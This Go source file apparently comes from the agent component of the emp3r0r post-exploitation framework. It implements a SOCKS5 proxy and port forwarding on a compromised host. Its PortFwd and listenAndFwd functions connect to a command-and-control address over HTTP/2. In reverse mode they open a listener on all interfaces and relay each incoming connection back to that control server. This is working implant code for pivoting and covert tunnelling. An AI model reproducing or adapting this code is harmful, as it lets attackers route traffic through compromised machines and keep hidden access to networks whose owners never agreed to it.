package agent

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/posener/h2conn"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	Addr   string // is a listener when `reverse` is set, a dialer when used normally
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}

var (
	// PortFwds manage port mappings
	PortFwds = make(map[string]*PortFwdSession)

	// PortFwdsMutex lock map
	PortFwdsMutex = &sync.Mutex{}
)

// Socks5Proxy sock5 proxy server on agent, listening on addr
// op: on/off
func Socks5Proxy(op string, addr string) (err error) {
	// op
	switch op {
	case "on":
		log.Printf("Starting Socks5Proxy %s", addr)
		go func() {
			err = tun.StartSocks5Proxy(addr, RuntimeConfig.DoHServer, emp3r0r_data.ProxyServer)
			if err != nil {
				log.Printf("StartSock5Proxy %s: %v", addr, err)
			}
		}()
	case "off":
		log.Printf("Stopping Socks5Proxy %s", addr)
		if emp3r0r_data.ProxyServer == nil {
			return errors.New("Proxy server is not running")
		}
		err = emp3r0r_data.ProxyServer.Shutdown()
		if err != nil {
			log.Print(err)
		}
		emp3r0r_data.ProxyServer = nil
	default:
		return errors.New("Operation not supported")
	}

	return err
}

// isPortFwdExist is there a port mapping to this addr already?
func isPortFwdExist(addr string) bool {
	for _, session := range PortFwds {
		if session.Addr == addr {
			return true
		}
	}

	return false
}

// PortFwd port mapping, receive request data then send it to target port on remote address
// addr: when reversed, addr should be port
func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err error) {
	var (
		session PortFwdSession

		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID

		// connection
		conn   *h2conn.Conn
		ctx    context.Context
		cancel context.CancelFunc
	)
	if !tun.ValidateIPPort(addr) && !reverse {
		return fmt.Errorf("Invalid address: %s", addr)
	}

	// connect via h2 to CC, or not
	ctx, cancel = context.WithCancel(context.Background())
	if reverse {
		log.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
	} else {
		conn, ctx, cancel, err = ConnectCC(url)
		log.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
		go tun.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
	}

	// remember to cleanup
	defer func() {
		cancel()
		if conn != nil {
			conn.Close()
		}

		PortFwdsMutex.Lock()
		delete(PortFwds, sessionID)
		PortFwdsMutex.Unlock()
		log.Printf("PortFwd stopped: %s (%s)", addr, sessionID)
	}()

	// save this session
	session.Addr = addr
	session.Conn = conn
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwdsMutex.Lock()
	PortFwds[sessionID] = &session
	PortFwdsMutex.Unlock()

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	for ctx.Err() == nil {
		time.Sleep(100 * time.Millisecond)
	}
	return
}

// start a local listener on agent, forward connections to CC
func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
	port, sessionID string) {
	var (
		err error
	)

	// serve a TCP connection received on agent side
	serveConn := func(conn net.Conn) {
		// tell CC this is a reversed port mapping
		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
		url := emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + shID

		// start a h2 connection per incoming TCP connection
		h2, _, h2cancel, err := ConnectCC(url)
		if err != nil {
			log.Printf("h2conn (%s) failed: %v", url, err)
			return
		}
		defer func() {
			_, _ = h2.Write([]byte("exit\n"))
			h2cancel()
			conn.Close()
		}()

		// iocopy
		go func() {
			_, err = io.Copy(conn, h2)
			if err != nil {
				log.Printf("h2 -> conn: %v", err)
			}
		}()
		go func() {
			_, err = io.Copy(h2, conn)
			if err != nil {
				log.Printf("conn -> h2: %v", err)
			}
		}()

		for ctx.Err() == nil {
			time.Sleep(100 * time.Millisecond)
		}
	}

	// listen
	addr := "0.0.0.0:" + port
	l, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("listen on %s failed: %s", addr, err)
		cancel()
	}
	defer func() {
		if l != nil {
			l.Close()
		}
		cancel()
	}()

	// serve
	for ctx.Err() == nil {
		conn, err := l.Accept()
		if err != nil {
			log.Printf("Listening on 0.0.0.0:%s: %v", port, err)
			continue
		}
		go serveConn(conn)
	}
}
